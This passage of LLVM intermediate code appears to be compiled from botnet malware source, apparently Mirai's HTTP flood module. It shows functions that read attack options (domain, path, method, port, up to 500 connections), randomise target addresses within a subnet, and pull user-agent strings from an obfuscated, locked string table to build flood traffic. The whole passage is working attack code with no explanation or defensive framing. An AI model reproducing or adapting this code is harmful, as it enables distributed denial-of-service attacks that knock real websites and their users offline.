  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* %20, i32 10)
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* %20) #6
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_http_state*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i16, align 2
  %20 = alloca [10241 x i8], align 16
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.fd_set, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.timeval, align 8
  %26 = alloca %struct.attack_http_state*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.sockaddr_in, align 4
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %34 = alloca [10240 x i8], align 16
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  %46 = alloca i8*, align 8
  %47 = alloca i32, align 4
  %48 = alloca i32, align 4
  %49 = alloca i8*, align 8
  %50 = alloca i32, align 4
  %51 = alloca i32, align 4
  %52 = alloca i32, align 4
  %53 = alloca i32, align 4
  %54 = alloca i8*, align 8
  %55 = alloca i32, align 4
  %56 = alloca i32, align 4
  %57 = alloca i8*, align 8
  %58 = alloca i32, align 4
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  %61 = alloca i32, align 4
  %62 = alloca i32, align 4
  %63 = alloca i32, align 4
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  store i32 0, i32* %12, align 4
  store %struct.attack_http_state* null, %struct.attack_http_state** %13, align 8
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i8* @attack_get_opt_str(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 21, i8* null)
  store i8* %66, i8** %14, align 8
  %67 = load i8, i8* %7, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %69 = call i8* @attack_get_opt_str(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 20, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  store i8* %69, i8** %15, align 8
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i8* @attack_get_opt_str(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 8, i8* null)
  store i8* %72, i8** %16, align 8
  %73 = load i8, i8* %7, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %75 = call i8* @attack_get_opt_str(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 22, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i32 0, i32 0))
  store i8* %75, i8** %17, align 8
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 24, i32 1)
  store i32 %78, i32* %18, align 4
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 7, i32 80)
  %82 = trunc i32 %81 to i16
  store i16 %82, i16* %19, align 2
  %83 = bitcast [10241 x i8]* %20 to i8*
  call void @llvm.memset.p0i8.i64(i8* %83, i8 0, i64 10241, i32 16, i1 false)
  %84 = load i8*, i8** %16, align 8
  %85 = icmp eq i8* %84, null
  br i1 %85, label %89, label %86

; <label>:86:                                     ; preds = %4
  %87 = load i8*, i8** %17, align 8
  %88 = icmp eq i8* %87, null
  br i1 %88, label %89, label %90

; <label>:89:                                     ; preds = %86, %4
  br label %2535

; <label>:90:                                     ; preds = %86
  %91 = load i8*, i8** %17, align 8
  %92 = call i32 @util_strlen(i8* %91)
  %93 = icmp sgt i32 %92, 255
  br i1 %93, label %94, label %95

; <label>:94:                                     ; preds = %90
  br label %2535

; <label>:95:                                     ; preds = %90
  %96 = load i8*, i8** %16, align 8
  %97 = call i32 @util_strlen(i8* %96)
  %98 = icmp sgt i32 %97, 127
  br i1 %98, label %99, label %100

; <label>:99:                                     ; preds = %95
  br label %2535

; <label>:100:                                    ; preds = %95
  %101 = load i8*, i8** %15, align 8
  %102 = call i32 @util_strlen(i8* %101)
  %103 = icmp sgt i32 %102, 9
  br i1 %103, label %104, label %105

; <label>:104:                                    ; preds = %100
  br label %2535

; <label>:105:                                    ; preds = %100
  store i32 0, i32* %10, align 4
  br label %106

; <label>:106:                                    ; preds = %137, %105
  %107 = load i32, i32* %10, align 4
  %108 = load i8*, i8** %15, align 8
  %109 = call i32 @util_strlen(i8* %108)
  %110 = icmp slt i32 %107, %109
  br i1 %110, label %111, label %140

; <label>:111:                                    ; preds = %106
  %112 = load i8*, i8** %15, align 8
  %113 = load i32, i32* %10, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  %116 = load i8, i8* %115, align 1
  %117 = sext i8 %116 to i32
  %118 = icmp sge i32 %117, 97
  br i1 %118, label %119, label %136

; <label>:119:                                    ; preds = %111
  %120 = load i8*, i8** %15, align 8
  %121 = load i32, i32* %10, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8, i8* %120, i64 %122
  %124 = load i8, i8* %123, align 1
  %125 = sext i8 %124 to i32
  %126 = icmp sle i32 %125, 122
  br i1 %126, label %127, label %136

; <label>:127:                                    ; preds = %119
  %128 = load i8*, i8** %15, align 8
  %129 = load i32, i32* %10, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8, i8* %128, i64 %130
  %132 = load i8, i8* %131, align 1
  %133 = sext i8 %132 to i32
  %134 = sub nsw i32 %133, 32
  %135 = trunc i32 %134 to i8
  store i8 %135, i8* %131, align 1
  br label %136

; <label>:136:                                    ; preds = %127, %119, %111
  br label %137

; <label>:137:                                    ; preds = %136
  %138 = load i32, i32* %10, align 4
  %139 = add nsw i32 %138, 1
  store i32 %139, i32* %10, align 4
  br label %106

; <label>:140:                                    ; preds = %106
  %141 = load i32, i32* %18, align 4
  %142 = icmp sgt i32 %141, 500
  br i1 %142, label %143, label %144

; <label>:143:                                    ; preds = %140
  store i32 500, i32* %18, align 4
  br label %144

; <label>:144:                                    ; preds = %143, %140
  call void @table_unlock_val(i8 zeroext 36)
  call void @table_unlock_val(i8 zeroext 37)
  call void @table_unlock_val(i8 zeroext 38)
  call void @table_unlock_val(i8 zeroext 39)
  call void @table_unlock_val(i8 zeroext 40)
  call void @table_unlock_val(i8 zeroext 41)
  call void @table_unlock_val(i8 zeroext 42)
  call void @table_unlock_val(i8 zeroext 43)
  call void @table_unlock_val(i8 zeroext 44)
  call void @table_unlock_val(i8 zeroext 45)
  call void @table_unlock_val(i8 zeroext 46)
  %145 = load i32, i32* %18, align 4
  %146 = sext i32 %145 to i64
  %147 = call noalias i8* @calloc(i64 %146, i64 3140) #6
  %148 = bitcast i8* %147 to %struct.attack_http_state*
  store %struct.attack_http_state* %148, %struct.attack_http_state** %13, align 8
  store i32 0, i32* %9, align 4
  br label %149

; <label>:149:                                    ; preds = %436, %144
  %150 = load i32, i32* %9, align 4
  %151 = load i32, i32* %18, align 4
  %152 = icmp slt i32 %150, %151
  br i1 %152, label %153, label %439

; <label>:153:                                    ; preds = %149
  %154 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %155 = load i32, i32* %9, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %154, i64 %156
  %158 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %157, i32 0, i32 1
  store i8 0, i8* %158, align 4
  %159 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %160 = load i32, i32* %9, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %159, i64 %161
  %163 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %162, i32 0, i32 0
  store i32 -1, i32* %163, align 4
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = load i8, i8* %5, align 1
  %167 = zext i8 %166 to i32
  %168 = srem i32 %165, %167
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %169
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i32 0, i32 1
  %172 = load i32, i32* %171, align 4
  %173 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %174 = load i32, i32* %9, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %173, i64 %175
  %177 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %176, i32 0, i32 4
  store i32 %172, i32* %177, align 4
  %178 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %179 = load i32, i32* %9, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %178, i64 %180
  %182 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %181, i32 0, i32 6
  %183 = getelementptr inbounds [257 x i8], [257 x i8]* %182, i32 0, i32 0
  %184 = load i8*, i8** %17, align 8
  %185 = call i32 @util_strcpy(i8* %183, i8* %184)
  %186 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %187 = load i32, i32* %9, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %186, i64 %188
  %190 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %189, i32 0, i32 6
  %191 = getelementptr inbounds [257 x i8], [257 x i8]* %190, i64 0, i64 0
  %192 = load i8, i8* %191, align 4
  %193 = sext i8 %192 to i32
  %194 = icmp ne i32 %193, 47
  br i1 %194, label %195, label %223

; <label>:195:                                    ; preds = %153
  %196 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %197 = load i32, i32* %9, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %199, i32 0, i32 6
  %201 = getelementptr inbounds [257 x i8], [257 x i8]* %200, i32 0, i32 0
  %202 = getelementptr inbounds i8, i8* %201, i64 1
  %203 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %204 = load i32, i32* %9, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %203, i64 %205
  %207 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %206, i32 0, i32 6
  %208 = getelementptr inbounds [257 x i8], [257 x i8]* %207, i32 0, i32 0
  %209 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %210 = load i32, i32* %9, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %209, i64 %211
  %213 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %212, i32 0, i32 6
  %214 = getelementptr inbounds [257 x i8], [257 x i8]* %213, i32 0, i32 0
  %215 = call i32 @util_strlen(i8* %214)
  %216 = sext i32 %215 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %202, i8* %208, i64 %216, i32 1, i1 false)
  %217 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %218 = load i32, i32* %9, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %217, i64 %219
  %221 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %220, i32 0, i32 6
  %222 = getelementptr inbounds [257 x i8], [257 x i8]* %221, i64 0, i64 0
  store i8 47, i8* %222, align 4
  br label %223

; <label>:223:                                    ; preds = %195, %153
  %224 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %225 = load i32, i32* %9, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %224, i64 %226
  %228 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %227, i32 0, i32 10
  %229 = getelementptr inbounds [9 x i8], [9 x i8]* %228, i32 0, i32 0
  %230 = load i8*, i8** %15, align 8
  %231 = call i32 @util_strcpy(i8* %229, i8* %230)
  %232 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %233 = load i32, i32* %9, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %232, i64 %234
  %236 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %235, i32 0, i32 9
  %237 = getelementptr inbounds [9 x i8], [9 x i8]* %236, i32 0, i32 0
  %238 = load i8*, i8** %15, align 8
  %239 = call i32 @util_strcpy(i8* %237, i8* %238)
  %240 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %241 = load i32, i32* %9, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %240, i64 %242
  %244 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %243, i32 0, i32 7
  %245 = getelementptr inbounds [129 x i8], [129 x i8]* %244, i32 0, i32 0
  %246 = load i8*, i8** %16, align 8
  %247 = call i32 @util_strcpy(i8* %245, i8* %246)
  %248 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %249 = load i32, i32* %9, align 4
  %250 = load i8, i8* %5, align 1
  %251 = zext i8 %250 to i32
  %252 = srem i32 %249, %251
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %248, i64 %253
  %255 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %254, i32 0, i32 2
  %256 = load i8, i8* %255, align 4
  %257 = zext i8 %256 to i32
  %258 = icmp slt i32 %257, 32
  br i1 %258, label %259, label %289

; <label>:259:                                    ; preds = %223
  %260 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %261 = load i32, i32* %9, align 4
  %262 = load i8, i8* %5, align 1
  %263 = zext i8 %262 to i32
  %264 = srem i32 %261, %263
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %260, i64 %265
  %267 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %266, i32 0, i32 1
  %268 = load i32, i32* %267, align 4
  %269 = call i32 @ntohl(i32 %268) #7
  %270 = call i32 @rand_next()
  %271 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %272 = load i32, i32* %9, align 4
  %273 = load i8, i8* %5, align 1
  %274 = zext i8 %273 to i32
  %275 = srem i32 %272, %274
  %276 = sext i32 %275 to i64
  %277 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %271, i64 %276
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %277, i32 0, i32 2
  %279 = load i8, i8* %278, align 4
  %280 = zext i8 %279 to i32
  %281 = lshr i32 %270, %280
  %282 = add i32 %269, %281
  %283 = call i32 @htonl(i32 %282) #7
  %284 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %285 = load i32, i32* %9, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %284, i64 %286
  %288 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %287, i32 0, i32 4
  store i32 %283, i32* %288, align 4
  br label %289

; <label>:289:                                    ; preds = %259, %223
  %290 = call i32 @rand_next()
  %291 = urem i32 %290, 15
  switch i32 %291, label %427 [
    i32 0, label %292
    i32 1, label %301
    i32 2, label %310
    i32 3, label %319
    i32 4, label %328
    i32 5, label %337
    i32 6, label %346
    i32 7, label %355
    i32 8, label %364
    i32 9, label %373
    i32 10, label %382
    i32 11, label %391
    i32 12, label %400
    i32 13, label %409
    i32 14, label %418
  ]

; <label>:292:                                    ; preds = %289
  call void @table_unlock_val(i8 zeroext 47)
  %293 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %294 = load i32, i32* %9, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %296, i32 0, i32 5
  %298 = getelementptr inbounds [512 x i8], [512 x i8]* %297, i32 0, i32 0
  %299 = call i8* @table_retrieve_val(i32 47, i32* null)
  %300 = call i32 @util_strcpy(i8* %298, i8* %299)
  call void @table_lock_val(i8 zeroext 47)
  br label %427

; <label>:301:                                    ; preds = %289
  call void @table_unlock_val(i8 zeroext 48)
  %302 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %303 = load i32, i32* %9, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %302, i64 %304
  %306 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %305, i32 0, i32 5
  %307 = getelementptr inbounds [512 x i8], [512 x i8]* %306, i32 0, i32 0
  %308 = call i8* @table_retrieve_val(i32 48, i32* null)
  %309 = call i32 @util_strcpy(i8* %307, i8* %308)
  call void @table_lock_val(i8 zeroext 48)
  br label %427

; <label>:310:                                    ; preds = %289
  call void @table_unlock_val(i8 zeroext 49)
  %311 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %314, i32 0, i32 5
  %316 = getelementptr inbounds [512 x i8], [512 x i8]* %315, i32 0, i32 0
  %317 = call i8* @table_retrieve_val(i32 49, i32* null)
  %318 = call i32 @util_strcpy(i8* %316, i8* %317)
  call void @table_lock_val(i8 zeroext 49)
  br label %427

; <label>:319:                                    ; preds = %289
  call void @table_unlock_val(i8 zeroext 50)
  %320 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %321 = load i32, i32* %9, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %320, i64 %322
  %324 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %323, i32 0, i32 5
  %325 = getelementptr inbounds [512 x i8], [512 x i8]* %324, i32 0, i32 0
  %326 = call i8* @table_retrieve_val(i32 50, i32* null)
  %327 = call i32 @util_strcpy(i8* %325, i8* %326)
  call void @table_lock_val(i8 zeroext 50)
  br label %427

; <label>:328:                                    ; preds = %289
  call void @table_unlock_val(i8 zeroext 51)
  %329 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %332, i32 0, i32 5
  %334 = getelementptr inbounds [512 x i8], [512 x i8]* %333, i32 0, i32 0
  %335 = call i8* @table_retrieve_val(i32 51, i32* null)
  %336 = call i32 @util_strcpy(i8* %334, i8* %335)
  call void @table_lock_val(i8 zeroext 51)
  br label %427

; <label>:337:                                    ; preds = %289
  call void @table_unlock_val(i8 zeroext 52)
  %338 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %339 = load i32, i32* %9, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %338, i64 %340
  %342 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %341, i32 0, i32 5
  %343 = getelementptr inbounds [512 x i8], [512 x i8]* %342, i32 0, i32 0
  %344 = call i8* @table_retrieve_val(i32 52, i32* null)
  %345 = call i32 @util_strcpy(i8* %343, i8* %344)
  call void @table_lock_val(i8 zeroext 52)
  br label %427

; <label>:346:                                    ; preds = %289
  call void @table_unlock_val(i8 zeroext 53)
  %347 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %348 = load i32, i32* %9, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %347, i64 %349
  %351 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %350, i32 0, i32 5
  %352 = getelementptr inbounds [512 x i8], [512 x i8]* %351, i32 0, i32 0
  %353 = call i8* @table_retrieve_val(i32 53, i32* null)
  %354 = call i32 @util_strcpy(i8* %352, i8* %353)
  call void @table_lock_val(i8 zeroext 53)
  br label %427

; <label>:355:                                    ; preds = %289
  call void @table_unlock_val(i8 zeroext 54)
  %356 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %357 = load i32, i32* %9, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %356, i64 %358
  %360 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %359, i32 0, i32 5
  %361 = getelementptr inbounds [512 x i8], [512 x i8]* %360, i32 0, i32 0
  %362 = call i8* @table_retrieve_val(i32 54, i32* null)
  %363 = call i32 @util_strcpy(i8* %361, i8* %362)
  call void @table_lock_val(i8 zeroext 54)
  br label %427

; <label>:364:                                    ; preds = %289
  call void @table_unlock_val(i8 zeroext 55)
  %365 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %366 = load i32, i32* %9, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %365, i64 %367
  %369 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %368, i32 0, i32 5
  %370 = getelementptr inbounds [512 x i8], [512 x i8]* %369, i32 0, i32 0
  %371 = call i8* @table_retrieve_val(i32 55, i32* null)
  %372 = call i32 @util_strcpy(i8* %370, i8* %371)
  call void @table_lock_val(i8 zeroext 55)
  br label %427

; <label>:373:                                    ; preds = %289
  call void @table_unlock_val(i8 zeroext 56)
  %374 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %375 = load i32, i32* %9, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %374, i64 %376
  %378 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %377, i32 0, i32 5
  %379 = getelementptr inbounds [512 x i8], [512 x i8]* %378, i32 0, i32 0
  %380 = call i8* @table_retrieve_val(i32 56, i32* null)
  %381 = call i32 @util_strcpy(i8* %379, i8* %380)
  call void @table_lock_val(i8 zeroext 56)
  br label %427

; <label>:382:                                    ; preds = %289
  call void @table_unlock_val(i8 zeroext 57)
  %383 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %384 = load i32, i32* %9, align 4
  %385 = sext i32 %384 to i64
  %386 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %383, i64 %385
  %387 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %386, i32 0, i32 5
  %388 = getelementptr inbounds [512 x i8], [512 x i8]* %387, i32 0, i32 0
  %389 = call i8* @table_retrieve_val(i32 57, i32* null)
  %390 = call i32 @util_strcpy(i8* %388, i8* %389)
  call void @table_lock_val(i8 zeroext 57)
  br label %427

; <label>:391:                                    ; preds = %289
  call void @table_unlock_val(i8 zeroext 58)
  %392 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %393 = load i32, i32* %9, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %392, i64 %394
  %396 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %395, i32 0, i32 5
  %397 = getelementptr inbounds [512 x i8], [512 x i8]* %396, i32 0, i32 0
  %398 = call i8* @table_retrieve_val(i32 58, i32* null)
  %399 = call i32 @util_strcpy(i8* %397, i8* %398)
  call void @table_lock_val(i8 zeroext 58)
  br label %427

; <label>:400:                                    ; preds = %289
  call void @table_unlock_val(i8 zeroext 59)
  %401 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %402 = load i32, i32* %9, align 4
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %401, i64 %403
  %405 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %404, i32 0, i32 5
  %406 = getelementptr inbounds [512 x i8], [512 x i8]* %405, i32 0, i32 0
  %407 = call i8* @table_retrieve_val(i32 59, i32* null)
  %408 = call i32 @util_strcpy(i8* %406, i8* %407)
  call void @table_lock_val(i8 zeroext 59)
  br label %427

; <label>:409:                                    ; preds = %289
  call void @table_unlock_val(i8 zeroext 60)
  %410 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %411 = load i32, i32* %9, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %410, i64 %412
  %414 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %413, i32 0, i32 5
  %415 = getelementptr inbounds [512 x i8], [512 x i8]* %414, i32 0, i32 0
  %416 = call i8* @table_retrieve_val(i32 60, i32* null)
  %417 = call i32 @util_strcpy(i8* %415, i8* %416)
  call void @table_lock_val(i8 zeroext 60)
  br label %427

; <label>:418:                                    ; preds = %289
  call void @table_unlock_val(i8 zeroext 61)
  %419 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %420 = load i32, i32* %9, align 4
  %421 = sext i32 %420 to i64
  %422 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %419, i64 %421
  %423 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %422, i32 0, i32 5
  %424 = getelementptr inbounds [512 x i8], [512 x i8]* %423, i32 0, i32 0
  %425 = call i8* @table_retrieve_val(i32 61, i32* null)
  %426 = call i32 @util_strcpy(i8* %424, i8* %425)
  call void @table_lock_val(i8 zeroext 61)
  br label %427

; <label>:427:                                    ; preds = %418, %409, %400, %391, %382, %373, %364, %355, %346, %337, %328, %319, %310, %301, %292, %289
  %428 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %429 = load i32, i32* %9, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %428, i64 %430
  %432 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %431, i32 0, i32 6
  %433 = getelementptr inbounds [257 x i8], [257 x i8]* %432, i32 0, i32 0
  %434 = load i8*, i8** %17, align 8
  %435 = call i32 @util_strcpy(i8* %433, i8* %434)
  br label %436

; <label>:436:                                    ; preds = %427
  %437 = load i32, i32* %9, align 4
